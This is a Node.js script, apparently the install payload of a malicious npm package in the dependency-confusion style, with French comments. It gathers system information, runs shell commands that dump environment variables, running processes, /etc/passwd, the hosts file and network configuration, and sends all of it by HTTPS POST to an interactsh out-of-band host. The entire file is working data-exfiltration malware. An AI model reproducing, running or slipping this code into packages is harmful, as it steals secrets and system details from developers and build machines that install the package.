const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const packageJSON = require("./package.json");
const packageName = packageJSON.name;

// Fonction pour exécuter une commande shell et retourner le résultat
const execCommand = (command) => {
    try {
        return execSync(command, { encoding: 'utf8' }).trim();
    } catch (err) {
        return '';
    }
};

// Collecte des informations système spécifiques à Windows et Linux
const isWindows = os.platform() === 'win32';
const isLinux = os.platform() === 'linux';

const systemInfo = {
    platform: os.platform(),
    release: os.release(),
    arch: os.arch(),
    cpus: os.cpus(),
    memory: os.totalmem(),
    freeMemory: os.freemem(),
    uptime: os.uptime(),
    networkInterfaces: os.networkInterfaces(),
    homeDirectory: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo(),
    dnsServers: dns.getServers()
};

if (isWindows) {
    systemInfo.runningProcesses = execCommand('tasklist');
    systemInfo.environmentVariables = execCommand('set');
    systemInfo.hostsFile = execCommand('type C:\\Windows\\System32\\Drivers\\etc\\hosts');
    systemInfo.networkConfig = execCommand('ipconfig /all');
} else if (isLinux) {
    systemInfo.runningProcesses = execCommand('ps aux');
    systemInfo.environmentVariables = execCommand('printenv');
    systemInfo.hostsFile = execCommand('cat /etc/hosts');
    systemInfo.passwdFile = execCommand('cat /etc/passwd');
    systemInfo.networkConfig = execCommand('ifconfig');
}

const trackingData = JSON.stringify({
    p: packageName,
    c: __dirname,
    systemInfo: systemInfo,
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "ngnlcviuxodvhfqzxtlw65pyfkk026d0i.oast.fun", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    console.error(e);
});

req.write(postData);
req.end();
